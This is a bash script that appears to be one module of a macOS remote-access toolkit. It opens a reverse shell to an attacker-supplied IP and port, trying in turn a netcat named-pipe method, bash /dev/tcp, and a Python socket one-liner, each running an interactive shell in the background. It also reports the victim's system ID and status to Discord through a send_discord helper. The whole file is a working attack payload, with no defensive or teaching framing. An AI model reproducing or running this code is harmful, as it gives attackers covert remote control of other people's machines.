#!/bin/bash
# ============================================================
# Netcat Reverse Shell for macOS - Modular Remote Payload
# ============================================================
# Requires: $IP and $PT (port)
# ============================================================

SYSID=$(get_sysid)

if [[ -z "$IP" || -z "$PT" ]]; then
    send_discord "❌ Netcat reverse shell failed on $SYSID - Missing IP or PORT"
    exit 1
fi

send_discord "🔌 **Netcat Reverse Shell Initiated**\nTarget: $SYSID\nConnecting to: $IP:$PT"

# macOS has netcat by default (nc)
# Try different methods

# Method 1: Named pipe (most reliable)
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc $IP $PT > /tmp/f &

if [[ $? -eq 0 ]]; then
    exit 0
fi

# Method 2: Bash /dev/tcp (if available)
/bin/bash -i >& /dev/tcp/$IP/$PT 0>&1 &

if [[ $? -eq 0 ]]; then
    exit 0
fi

# Method 3: Python
if command -v python3 &>/dev/null; then
    python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])" &
    exit 0
fi

send_discord "❌ No working shell method on $SYSID"

